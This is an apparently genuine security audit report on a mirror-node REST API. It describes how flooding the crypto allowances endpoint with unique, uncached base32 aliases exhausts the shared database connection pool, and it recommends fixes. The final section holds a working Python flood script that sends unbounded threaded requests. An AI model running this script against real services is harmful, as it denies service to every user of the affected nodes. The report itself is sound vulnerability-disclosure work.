# Audit Report

## Title
Unauthenticated DB Connection Pool Exhaustion via Unique Alias Flooding on `/accounts/:idOrAliasOrEvmAddress/allowances/crypto`

## Summary
The `/api/v1/accounts/{idOrAliasOrEvmAddress}/allowances/crypto` endpoint unconditionally issues a database query for every unique valid base32 alias string supplied in the path parameter. Because there is no per-IP rate limiting and 404 responses (alias not found) are never cached, an unauthenticated attacker can flood the endpoint with an unbounded stream of unique aliases, each consuming a connection from the finite DB pool, causing pool exhaustion and degrading all endpoints that share that pool.

## Finding Description

**Exact code path:**

`rest/controllers/cryptoAllowanceController.js` line 77 calls `EntityService.getEncodedId(req.params[...])` unconditionally before any caching or rate-limiting check. [7](#0-6) 

`getEncodedId` in `rest/service/entityService.js` lines 125–126 detects a valid alias string and calls `getAccountIdFromAlias` → `getAccountFromAlias`. [2](#0-1) 

`getAccountFromAlias` executes `entityFromAliasQuery` against the DB on every invocation with no in-process cache. [8](#0-7) [9](#0-8) 

**Three failed assumptions:**

1. **No rate limiting.** `server.js` registers `authHandler`, `requestLogger`, optional `metricsHandler`, and optional `responseCacheCheckHandler` — no `express-rate-limit` or equivalent is present anywhere in the production middleware chain. [10](#0-9) 

2. **404 responses are never cached.** `responseCacheUpdateHandler` only stores a response when `httpStatusCodes.isSuccess(res.statusCode)` is true (or the status is 304). A non-existent alias throws `NotFoundError` → HTTP 404, which is never written to Redis. Every unique alias therefore bypasses the cache entirely. [11](#0-10) 

3. **Finite DB connection pool.** The pool is bounded by `max: config.db.pool.maxConnections`. Each alias lookup acquires a connection for the duration of the query. [12](#0-11) 

**Alias generation space is effectively unlimited.** `AccountAlias.isValid` accepts any string matching `/^(\d{1,5}\.){0,2}[A-Z2-7]+$/`. An 8-character base32 string has 32⁸ ≈ 10¹² unique values, all of which pass validation and reach the DB. [6](#0-5) [2](#0-1) 

**Additional aggravating factor:** The response cache is only active when both `config.cache.response.enabled` AND `config.redis.enabled` are true. In deployments without Redis, the cache layer is entirely absent, making the attack more effective. [13](#0-12) 

## Impact Explanation
The DB pool is shared across every endpoint served by a mirror node replica. Exhausting it (all `maxConnections` slots occupied by alias-lookup queries) causes every subsequent request — transactions, balances, tokens, etc. — to queue until `connectionTimeoutMillis` expires and then fail with a DB error. The attack is stateless, requires no authentication, and can be directed simultaneously at multiple replicas.

## Likelihood Explanation
The attack requires only an HTTP client and knowledge of the public OpenAPI spec. Generating unique valid base32 strings is trivial and can be automated with a simple loop. No credentials, tokens, or on-chain state are needed. A single attacker with modest bandwidth (a few hundred concurrent connections) can saturate a default-sized pg pool.

## Recommendation
1. **Add rate limiting** at the application layer (e.g., `express-rate-limit` keyed on `req.ip`) for all endpoints that trigger DB lookups, with a stricter limit on alias/EVM-address resolution paths.
2. **Cache negative (404) alias lookups** in Redis with a short TTL (e.g., 5–30 seconds) so repeated lookups for the same non-existent alias do not hit the DB.
3. **Add an alias-format pre-filter** that rejects structurally valid but semantically implausible aliases (e.g., enforce a minimum/maximum byte length after base32 decode) before issuing a DB query.
4. **Consider a per-request DB query budget** or a dedicated, smaller connection pool for alias-resolution queries to limit blast radius.

## Proof of Concept
```bash
# Generate and send unique base32 aliases in a tight loop
python3 - <<'EOF'
import itertools, requests, string, threading

BASE32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
BASE_URL = 'http://<mirror-node>/api/v1/accounts/{}/allowances/crypto'

def gen_aliases():
    for combo in itertools.product(BASE32, repeat=8):
        yield ''.join(combo)

def flood():
    for alias in gen_aliases():
        threading.Thread(
            target=requests.get,
            args=(BASE_URL.format(alias),),
            daemon=True
        ).start()

flood()
EOF
```
Each request with a unique alias that does not exist in the DB returns HTTP 404, is never cached, and consumes a DB pool connection for the duration of the `entityFromAliasQuery` execution. Sustaining this at a rate exceeding `maxConnections` / avg-query-latency exhausts the pool.
